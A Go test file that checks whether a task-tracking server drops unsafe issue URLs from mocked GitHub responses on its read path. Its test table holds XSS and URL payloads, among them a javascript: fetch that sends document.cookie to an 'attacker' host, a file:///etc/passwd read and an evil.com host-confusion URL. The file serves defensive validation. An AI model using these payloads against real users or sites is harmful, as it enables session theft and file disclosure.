package server_test

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"sort"
	"strings"
	"testing"

	pb "github.com/farmtable-io/farmtable/api/farmtable/v1"
	"github.com/farmtable-io/farmtable/internal/store"
	"github.com/farmtable-io/farmtable/internal/store/ent/collection"
	"github.com/farmtable-io/farmtable/internal/testutil"
	"github.com/google/uuid"
	"google.golang.org/protobuf/types/known/structpb"
)

// issueNodeJSON renders one issue node for the canned GraphQL list response,
// with a caller-chosen `url`. That field is what
// platform/github/graphql_queries.go::issueBuildRemoteData copies verbatim into
// remote_data["remote_url"].
func issueNodeJSON(id int, title, url string) string {
	return fmt.Sprintf(`{
      "id": "I_issue%d",
      "number": %d,
      "title": %q,
      "body": "",
      "state": "OPEN",
      "stateReason": null,
      "createdAt": "2026-01-15T10:00:00Z",
      "updatedAt": "2026-01-16T12:00:00Z",
      "url": %q,
      "labels": {"nodes": []},
      "assignees": {"nodes": []},
      "milestone": null,
      "subIssues": {"nodes": [], "totalCount": 0},
      "subIssuesSummary": {"total": 0, "completed": 0, "percentCompleted": 0},
      "parent": null
    }`, id, id, title, url)
}

// mockGitHubGraphQLWithURLs serves a list response whose issues carry the given
// titles and URLs.
func mockGitHubGraphQLWithURLs(t *testing.T, nodes string) *httptest.Server {
	t.Helper()
	resp := fmt.Sprintf(`{"data":{"repository":{"issues":{"nodes":[%s],`+
		`"pageInfo":{"hasNextPage":false,"endCursor":""}}}}}`, nodes)
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("reading request body: %v", err)
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		switch bodyStr := string(body); {
		case strings.Contains(bodyStr, "repository(owner:") && strings.Contains(bodyStr, "issues("):
			_, _ = w.Write([]byte(resp))
		case strings.Contains(bodyStr, "repository(owner:"):
			_, _ = w.Write([]byte(`{"data":{"repository":{"id":"R_repo1"}}}`))
		default:
			_, _ = w.Write([]byte(`{"data":{}}`))
		}
	}))
}

// TestPassthroughReadDropsUnsafeRemoteURL covers the one URL path that no
// write-boundary check can reach.
//
// The live GitHub passthrough store synthesises remote_url from the GraphQL
// response on every ListTasks/GetTask and never persists it, so
// validateURLField at the UpdateTask/ImportCollection boundaries is
// structurally incapable of covering it. (GitHubPassThroughStore.UpdateTask
// also ignores RemoteData entirely, so a value validated there is discarded.)
// The design doc previously justified excluding this path on the grounds that
// "values originate from the upstream GitHub API" -- true, but that describes
// platform/github/github.go::buildRemoteData, which is unreachable in
// production. An earlier version of this comment said it "has no production
// caller"; review measured that it has two, at github.go:169 and github.go:200.
// The conclusion survives, but by a different route: those two callers sit on
// GitHubAdapter, and github.New / github.NewWithConfig have no non-test callers
// anywhere in the tree, so GitHubAdapter is never constructed outside tests and
// SyncCollection is unreachable. Nothing keeps that true -- wiring github.New()
// anywhere makes it false with no test going red -- which is a further reason
// for the read-path check this test pins.
//
// taskToProto in convert.go is the single convergence point for every read, so
// the check lives there and degrades (drops the field) rather than erroring: a
// bad URL from upstream must not fail the whole read.
//
// Not attacker-reachable today: issue.URL is GitHub-generated, there is no
// webhook receiver and no configurable API base URL. This pins the control so
// that stays true by construction rather than by argument.
func TestPassthroughReadDropsUnsafeRemoteURL(t *testing.T) {
	const (
		safeURL  = "https://github.com/acme/widgets/issues/1"
		safeName = "Legitimate issue"
	)

	unsafe := []struct {
		name string
		url  string
	}{
		{"javascript", "javascript:alert(1)"},
		{"javascript exfiltration", "javascript:fetch('//attacker/'+document.cookie)"},
		{"data html", "data:text/html,<script>alert(1)</script>"},
		{"vbscript", "vbscript:msgbox(1)"},
		{"file", "file:///etc/passwd"},
		// Rejected by the host check rather than the scheme check: net/url
		// yields Host == "" here, while the browser's WHATWG parser reads the
		// backslashes as slashes and navigates to evil.com.
		{"backslash host confusion", `http:/\/\evil.com`},
	}

	if len(unsafe) == 0 {
		t.Fatal("unsafe table is empty; this test would be vacuous")
	}

	for _, tc := range unsafe {
		t.Run(tc.name, func(t *testing.T) {
			ctx := context.Background()

			entStore, storeCleanup := testutil.NewTestStore(t)
			defer storeCleanup()

			ms := store.NewMultiStore(entStore)
			defer ms.Close()

			coll, err := ms.CreateCollection(ctx, store.CreateCollectionParams{
				Name:     "acme/widgets",
				Platform: string(collection.PlatformGithub),
				RemoteID: "acme/widgets",
			})
			if err != nil {
				t.Fatalf("CreateCollection: %v", err)
			}
			collID := coll.ID

			if _, err := ms.CreateLinkedAccount(ctx, store.CreateLinkedAccountParams{
				CollectionID: collID,
				Platform:     "github",
				AuthToken:    "ghp_mock_test_token",
				AuthMethod:   "pat",
				Scopes:       []string{"repo"},
			}); err != nil {
				t.Fatalf("CreateLinkedAccount: %v", err)
			}

			// Issue 1 carries the payload; issue 2 is the positive control and
			// travels the identical code path in the same response.
			mockGH := mockGitHubGraphQLWithURLs(t, strings.Join([]string{
				issueNodeJSON(1, "Poisoned issue", tc.url),
				issueNodeJSON(2, safeName, safeURL),
			}, ","))
			defer mockGH.Close()

			ms.SetResolver(func(platform collection.Platform, token string, rid string, cid uuid.UUID) (store.Store, error) {
				if platform != collection.PlatformGithub {
					return nil, nil
				}
				owner, repo, ok := store.ParseOwnerRepo(rid)
				if !ok {
					return nil, nil
				}
				return newPassThroughStoreWithMock(t, mockGH, owner, repo, cid), nil
			})

			client, grpcCleanup := testutil.NewTestServerWithMultiStore(t, ms)
			defer grpcCleanup()

			collIDStr := collID.String()
			resp, err := client.ListTasks(ctx, &pb.ListTasksRequest{CollectionId: &collIDStr})
			if err != nil {
				t.Fatalf("ListTasks: %v", err)
			}

			tasks := make(map[string]*pb.Task, len(resp.GetItems()))
			for _, task := range resp.GetItems() {
				tasks[task.GetName()] = task
			}

			poisoned, ok := tasks["Poisoned issue"]
			if !ok {
				t.Fatalf("poisoned task missing from response; got %d tasks %v",
					len(resp.GetItems()), keysOf(tasks))
			}

			// The whole point: the value does not reach the client, on ANY
			// carrier, and the read still succeeds.
			if poisoned.GetRemoteUrl() != "" {
				t.Errorf("remote_url %q from the passthrough read reached the client; "+
					"convert.go must drop non-http(s) values (scheme is not http/https, "+
					"or the URL has no host)", poisoned.GetRemoteUrl())
			}

			// NOTE ON THE UNTYPED CARRIER, because it is easy to add a vacuous
			// assertion here and this round is about not doing that.
			//
			// The typed field is not the only way the value can leave: taskToProto
			// also serialises the whole RemoteData map into pb.Task.remote_data,
			// and both GitHub adapters write the same issue URL a second time
			// under "html_url". That is a real gap and sanitizeRemoteData now
			// closes it -- but it CANNOT be pinned end-to-end on this particular
			// path, because remote_data is always empty here for an unrelated
			// reason: issueBuildRemoteData sets "labels" to a []string,
			// structpb.NewStruct rejects that type outright, and convert.go
			// discards the error. Measured; pinned by
			// TestGitHubPassthroughRemoteDataNeverSerialises.
			//
			// So asserting "remote_url is absent from remote_data" here would pass
			// against a completely unsanitized taskToProto. The non-vacuous pins
			// for the scrub are TestSanitizeRemoteDataScrubsEveryURLCarrier (the
			// function) and TestTaskToProtoScrubsRemoteDataURLCarriers (the
			// wiring), both of which use a map that actually serialises.
			if n := len(poisoned.GetRemoteData().GetFields()); n != 0 {
				t.Errorf("remote_data unexpectedly carries %d field(s) on the passthrough "+
					"path: %v. If the []string serialisation issue has been fixed, this "+
					"path can now ship remote_data and the assertions here must be "+
					"upgraded from this guard to real absence checks on remote_url and "+
					"html_url.", n, remoteDataKeysOf(poisoned.GetRemoteData().GetFields()))
			}

			// Degrade, do not fail: the rest of the task must still be intact.
			if poisoned.GetRemoteId() == "" {
				t.Error("dropping remote_url must not blank out the rest of the task: remote_id is empty")
			}

			// Positive control. Without it, this test would pass if ListTasks
			// returned tasks with every field empty, or if the drop were
			// unconditional and remote_url never reached the client at all.
			control, ok := tasks[safeName]
			if !ok {
				t.Fatalf("positive control task %q missing from response; got %v", safeName, keysOf(tasks))
			}
			if control.GetRemoteUrl() != safeURL {
				t.Errorf("positive control: legitimate remote_url should pass through unchanged; "+
					"got %q, want %q", control.GetRemoteUrl(), safeURL)
			}
		})
	}
}

func remoteDataKeysOf(m map[string]*structpb.Value) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func keysOf(m map[string]*pb.Task) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
